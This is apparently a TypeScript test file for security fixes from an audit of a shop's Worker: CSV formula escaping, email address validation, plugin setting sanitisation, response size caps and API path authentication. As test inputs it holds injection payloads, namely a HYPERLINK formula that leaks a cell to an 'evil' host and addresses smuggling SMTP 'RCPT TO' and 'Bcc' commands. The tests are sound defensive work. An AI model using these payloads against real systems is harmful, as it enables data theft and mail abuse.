import { describe, expect, it } from "vitest";
import { csvCell } from "../src/util/csv";
import { readTextCapped } from "../src/util/read-capped";
import { MailAddressError, buildMimeMessage, parseAddress } from "../src/mail/message";
import { settingsFromForm, type PluginManifest } from "../src/hooks/manifest";
import { FakeSupabase } from "./fake-supabase";
import { BASE, appWith } from "./helpers";

/** 2026-10-25 の監査（メール・hooks・CSV・API）の Worker 側の守り */
describe("CSV の式の無害化", () => {
  it("先頭が = + - @ タブ 改行 の文字列は ' を前置する。数値と普通の文字列はそのまま。引用は RFC 4180", () => {
    expect(csvCell('=HYPERLINK("https://evil/?"&A1,"open")')).toBe("\"'=HYPERLINK(\"\"https://evil/?\"\"&A1,\"\"open\"\")\"");
    expect(csvCell("+81-3-0000")).toBe("'+81-3-0000");
    expect(csvCell("-1-1")).toBe("'-1-1");
    expect(csvCell("@x")).toBe("'@x");
    expect(csvCell("\tx")).toBe("'\tx");
    expect(csvCell(-500)).toBe("-500");
    expect(csvCell("東京都 千代田区")).toBe("東京都 千代田区");
    expect(csvCell('a,"b"\nc')).toBe('"a,""b""\nc"');
    expect(csvCell(null)).toBe("");
  });
});

describe("メールのアドレスの形", () => {
  it("改行・空白・< > を含むアドレスは断る（SMTP のコマンドとヘッダに出すため）", () => {
    expect(parseAddress("Shop <shop@example.com>")).toEqual({ name: "Shop", email: "shop@example.com" });
    expect(parseAddress("shop@example.com")).toEqual({ email: "shop@example.com" });
    for (const bad of ["a@b.c\r\nRCPT TO:<evil@example.com>", "a@b\nX: y", "a b@example.com", "<a@b.c> x", "not-an-address", "a@b"]) {
      expect(() => parseAddress(bad), bad).toThrow(MailAddressError);
    }
    expect(() => buildMimeMessage({ from: "o@example.com\r\nBcc: evil@example.com", to: "m@example.com", subject: "s", text: "t" })).toThrow(MailAddressError);
    expect(() => buildMimeMessage({ from: "o@example.com", to: "m@example.com", bcc: ["x@example.com\r\nRCPT TO:<evil@example.com>"], subject: "s", text: "t" })).toThrow(MailAddressError);
  });
});

describe("プラグインの設定の値", () => {
  it("制御文字（改行を含む）は落とす", () => {
    const manifest = { name: "p", description: "", events: [], settings: [{ key: "from", label: "送信元", type: "string" }] } as unknown as PluginManifest;
    expect(settingsFromForm(manifest, { setting_from: "o@example.com\r\nRCPT TO:<evil@example.com>\x00" })).toEqual({ from: "o@example.comRCPT TO:<evil@example.com>" });
  });
});

describe("外部の応答の本文", () => {
  it("上限のバイト数で打ち切る", async () => {
    const big = new Response("x".repeat(10_000));
    expect((await readTextCapped(big, 100)).length).toBe(100);
    expect(await readTextCapped(new Response("abc"), 100)).toBe("abc");
    expect(await readTextCapped(new Response(null), 100)).toBe("");
  });
});

describe("AI 用 API の入口", () => {
  it("openapi.json は完全一致のパスだけ認証なし。接尾辞が同じ別のパスは 401", async () => {
    const sb = new FakeSupabase();
    const app = appWith(sb, {});
    expect((await app.request(`${BASE}/api/v1/openapi.json`)).status).toBe(200);
    for (const p of ["/api/v1/orders/openapi.json", "/api/v1/customers/openapi.json", "/api/v1/x/openapi.json"]) {
      expect((await app.request(`${BASE}${p}`)).status, p).toBe(401);
    }
  });
});
